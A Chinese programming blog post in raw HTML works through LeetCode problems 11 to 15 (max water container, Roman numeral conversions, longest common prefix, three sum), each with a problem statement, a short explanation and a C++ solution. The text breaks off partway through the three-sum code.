    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/65914867.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/65914867.jpg"></p><a id="more"></a><h2 id="11 盛最多水的容器"><a class="header-anchor" href="#11 盛最多水的容器" aria-hidden="true">¶</a> 11 盛最多水的容器</h2><ul><li>题目</li></ul><blockquote><p>给定 <em>n</em> 个非负整数 <em>a</em>1，<em>a</em>2，…，<em>a</em>n，每个数代表坐标中的一个点 (<em>i</em>, <em>ai</em>) 。在坐标内画 <em>n</em> 条垂直线，垂直线 <em>i</em> 的两个端点分别为 (<em>i</em>, <em>ai</em>) 和 (<em>i</em>, 0)。找出其中的两条线，使得它们与 <em>x</em> 轴共同构成的容器可以容纳最多的水。</p><p>**说明：**你不能倾斜容器，且 <em>n</em> 的值至少为 2。</p><p><img src="https://aliyun-lc-upload.oss-cn-hangzhou.aliyuncs.com/aliyun-lc-upload/uploads/2018/07/25/question_11.jpg" alt="img"></p><p>图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为 49。</p><p><strong>示例:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: [1,8,6,2,5,4,8,3,7]</span><br><span class="line">&gt; 输出: 49</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>暴力法</p><p>遍历每两个数据之间的面积</p><p>时间复杂度： O(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.8141079999999999em"></span><span class="strut bottom" style="height:.8141079999999999em;vertical-align:0"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathit">n</span><span class="vlist"><span style="top:-.363em;margin-right:.05em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord mathrm">2</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span>​</span></span></span></span></span></span>)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max_Area = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;height.size()<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=i+<span class="number">1</span>; j&lt;height.size(); j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> area = (j-i)*min(height[i], height[j]);</span><br><span class="line">                max_Area = max(area, max_Area);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_Area;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>双指针法</p><p>面积最大，长与宽相应较大，从首尾开始，宽最大，根据长度逐步变化，计算最大面积</p><p>时间复杂度： O(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.43056em"></span><span class="strut bottom" style="height:.43056em;vertical-align:0"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span>)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max_Area = <span class="number">0</span>, l=<span class="number">0</span>, r=height.size()<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">max_Area = max(max_Area, min(height[l], height[r])*(r-l));</span><br><span class="line"><span class="keyword">if</span> (height[l] &lt; height[r])  l ++;</span><br><span class="line"><span class="keyword">else</span>    r --;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">return</span> max_Area;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="12 整数转罗马数字"><a class="header-anchor" href="#12 整数转罗马数字" aria-hidden="true">¶</a> 12 整数转罗马数字</h2><ul><li>题目</li></ul><blockquote><p>罗马数字包含以下七种字符： <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code> 和 <code>M</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; 字符          数值</span><br><span class="line">&gt; I             1</span><br><span class="line">&gt; V             5</span><br><span class="line">&gt; X             10</span><br><span class="line">&gt; L             50</span><br><span class="line">&gt; C             100</span><br><span class="line">&gt; D             500</span><br><span class="line">&gt; M             1000</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>例如， 罗马数字 2 写做 <code>II</code> ，即为两个并列的 1。12 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 27 写做 <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li><li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。</li><li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li></ul><p>给定一个整数，将其转为罗马数字。输入确保在 1 到 3999 的范围内。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 3</span><br><span class="line">&gt; 输出: &quot;III&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 4</span><br><span class="line">&gt; 输出: &quot;IV&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 9</span><br><span class="line">&gt; 输出: &quot;IX&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 4:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 58</span><br><span class="line">&gt; 输出: &quot;LVIII&quot;</span><br><span class="line">&gt; 解释: C = 100, L = 50, XXX = 30, III = 3.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 5:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 1994</span><br><span class="line">&gt; 输出: &quot;MCMXCIV&quot;</span><br><span class="line">&gt; 解释: M = 1000, CM = 900, XC = 90, IV = 4.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>暴力法</p><p>对输入的数字，拆分为 千、百、十、个为</p><p>分别判断是否为9、5、4，再计算需要输出多少个1</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">intToRoman</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line"><span class="built_in">string</span> str = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">int</span> k = num/<span class="number">1000</span>;<span class="comment">// 千位</span></span><br><span class="line"><span class="keyword">while</span> (k --) &#123;</span><br><span class="line">str += <span class="string">'M'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">num %= <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> h = num/<span class="number">100</span>;<span class="comment">// 百位</span></span><br><span class="line"><span class="keyword">if</span> (h &gt;= <span class="number">5</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (h == <span class="number">9</span>) &#123;</span><br><span class="line">str += <span class="string">"CM"</span>;</span><br><span class="line">h -= <span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">str += <span class="string">'D'</span>;</span><br><span class="line">h -= <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (h == <span class="number">4</span>) &#123;</span><br><span class="line">str += <span class="string">"CD"</span>;</span><br><span class="line">h -= <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (h --) &#123;</span><br><span class="line">str += <span class="string">'C'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">num %= <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> t = num/<span class="number">10</span>;<span class="comment">// 十位</span></span><br><span class="line"><span class="keyword">if</span> (t &gt;= <span class="number">5</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (t == <span class="number">9</span>) &#123;</span><br><span class="line">str += <span class="string">"XC"</span>;</span><br><span class="line">t -= <span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">str += <span class="string">'L'</span>;</span><br><span class="line">t -= <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (t == <span class="number">4</span>) &#123;</span><br><span class="line">str += <span class="string">"XL"</span>;</span><br><span class="line">t -= <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (t --) &#123;</span><br><span class="line">str += <span class="string">'X'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">num %= <span class="number">10</span>;<span class="comment">// 个位</span></span><br><span class="line"><span class="keyword">if</span> (num &gt;= <span class="number">5</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">9</span>) &#123;</span><br><span class="line">str += <span class="string">"IX"</span>;</span><br><span class="line">num -= <span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">str += <span class="string">'V'</span>;</span><br><span class="line">num -= <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">4</span>) &#123;</span><br><span class="line">str += <span class="string">"IV"</span>;</span><br><span class="line">num -= <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (num --) &#123;</span><br><span class="line">str += <span class="string">'I'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="13 罗马数字转整数"><a class="header-anchor" href="#13 罗马数字转整数" aria-hidden="true">¶</a> 13 罗马数字转整数</h2><ul><li>题目</li></ul><blockquote><p>罗马数字包含以下七种字符: <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code> 和 <code>M</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; 字符          数值</span><br><span class="line">&gt; I             1</span><br><span class="line">&gt; V             5</span><br><span class="line">&gt; X             10</span><br><span class="line">&gt; L             50</span><br><span class="line">&gt; C             100</span><br><span class="line">&gt; D             500</span><br><span class="line">&gt; M             1000</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>例如， 罗马数字 2 写做 <code>II</code> ，即为两个并列的 1。12 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 27 写做 <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li><li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。</li><li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li></ul><p>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;III&quot;</span><br><span class="line">&gt; 输出: 3</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;IV&quot;</span><br><span class="line">&gt; 输出: 4</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;IX&quot;</span><br><span class="line">&gt; 输出: 9</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 4:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;LVIII&quot;</span><br><span class="line">&gt; 输出: 58</span><br><span class="line">&gt; 解释: L = 50, V= 5, III = 3.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 5:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;MCMXCIV&quot;</span><br><span class="line">&gt; 输出: 1994</span><br><span class="line">&gt; 解释: M = 1000, CM = 900, XC = 90, IV = 4.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>上一题的逆过程，并不能难</p><p>注意判断I、X、C出现的前一个字母即可</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=s.size()<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i] == <span class="string">'I'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (i&lt;s.size() &amp;&amp; s[i+<span class="number">1</span>] == <span class="string">'V'</span> || s[i+<span class="number">1</span>] == <span class="string">'X'</span>)    res -= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span>res += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">'V'</span>)res += <span class="number">5</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">'X'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (i&lt;s.size() &amp;&amp; s[i+<span class="number">1</span>] == <span class="string">'L'</span> || s[i+<span class="number">1</span>] == <span class="string">'C'</span>)    res -= <span class="number">10</span>;</span><br><span class="line"><span class="keyword">else</span>res += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">'L'</span>)   res += <span class="number">50</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">'C'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (i&lt;s.size() &amp;&amp; s[i+<span class="number">1</span>] == <span class="string">'D'</span> || s[i+<span class="number">1</span>] == <span class="string">'M'</span>)    res -= <span class="number">100</span>;</span><br><span class="line"><span class="keyword">else</span>res += <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">'D'</span>)   res += <span class="number">500</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">'M'</span>)   res += <span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="14 最长公共前缀"><a class="header-anchor" href="#14 最长公共前缀" aria-hidden="true">¶</a> 14 最长公共前缀</h2><ul><li>题目</li></ul><blockquote><p>编写一个函数来查找字符串数组中的最长公共前缀。</p><p>如果不存在公共前缀，返回空字符串 <code>&quot;&quot;</code>。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">&gt; 输出: &quot;fl&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">&gt; 输出: &quot;&quot;</span><br><span class="line">&gt; 解释: 输入不存在公共前缀。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>字符串数组为空，输出为 <code>“”</code></p><p>将第一个字符串与后面字符串对比，从第一个字母开始找到与后面字符串都不一样的字母位置</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestCommonPrefix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs.empty()) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;strs[<span class="number">0</span>].size(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;strs.size(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(strs[j][i]!=strs[<span class="number">0</span>][i]) <span class="keyword">return</span> strs[<span class="number">0</span>].substr(<span class="number">0</span>,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> strs[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="15 三数之和"><a class="header-anchor" href="#15 三数之和" aria-hidden="true">¶</a> 15 三数之和</h2><ul><li>题目</li></ul><blockquote><p>给定一个包含 <em>n</em> 个整数的数组 <code>nums</code>，判断 <code>nums</code> 中是否存在三个元素 *a，b，c ，*使得 <em>a + b + c =</em> 0 ？找出所有满足条件且不重复的三元组。</p><p>**注意：**答案中不可以包含重复的三元组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; 例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，</span><br><span class="line">&gt; </span><br><span class="line">&gt; 满足要求的三元组集合为：</span><br><span class="line">&gt; [</span><br><span class="line">&gt;   [-1, 0, 1],</span><br><span class="line">&gt;   [-1, -1, 2]</span><br><span class="line">&gt; ]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>第一题“两数之和”的升级版，ps：不是输出坐标，而是相应值的三元组</p><p>数组长度小于3，输出为<code>{}</code></p><p>为了防止出现重复的三元组，先对输入数组进行排序，再通过set添加，最后转化为vector</p><p>暴力法：</p><p>三次循环，时间复杂度：O(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>n</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">n^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.8141079999999999em"></span><span class="strut bottom" style="height:.8141079999999999em;vertical-align:0"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathit">n</span><span class="vlist"><span style="top:-.363em;margin-right:.05em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord mathrm">3</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span>​</span></span></span></span></span></span>)，超时</p><p>哈希：</p><p>确定第一个值，作为target，对之前第一题做法进行改进</p><p>时间复杂度：O(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.8141079999999999em"></span><span class="strut bottom" style="height:.8141079999999999em;vertical-align:0"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathit">n</span><span class="vlist"><span style="top:-.363em;margin-right:.05em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord mathrm">2</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span>​</span></span></span></span></span></span>)，超时</p><p>二分法：</p><p>确定第一个值，对之后的值进行二分，从小到大，左值加右值，对比目标值target</p><p>时间复杂度：O(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">nlogn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.69444em"></span><span class="strut bottom" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span><span class="mord mathit" style="margin-right:.01968em">l</span><span class="mord mathit">o</span><span class="mord mathit" style="margin-right:.03588em">g</span><span class="mord mathit">n</span></span></span></span>)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; threeSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line"><span class="keyword">int</span> len = nums.size();</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">3</span>)    <span 